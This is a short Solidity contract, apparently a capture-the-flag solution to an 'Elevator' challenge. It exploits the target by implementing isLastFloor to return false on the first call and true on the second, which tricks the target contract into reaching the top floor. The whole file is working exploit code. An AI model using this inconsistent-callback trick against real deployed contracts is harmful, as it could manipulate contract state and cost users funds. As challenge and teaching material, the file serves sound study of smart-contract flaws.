// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Elevator.sol';

contract ElevatorAttack {
    Elevator challenge;
    uint256 timesCalled;

    constructor (address _targetAddress) public {
        challenge = Elevator(_targetAddress);
    }
    function attack() external payable {
        challenge.goTo(0);
    }

    function isLastFloor(uint256 /* floor */) external returns (bool) {
        timesCalled++;
        if (timesCalled > 1) return true;
        else return false;
    }
}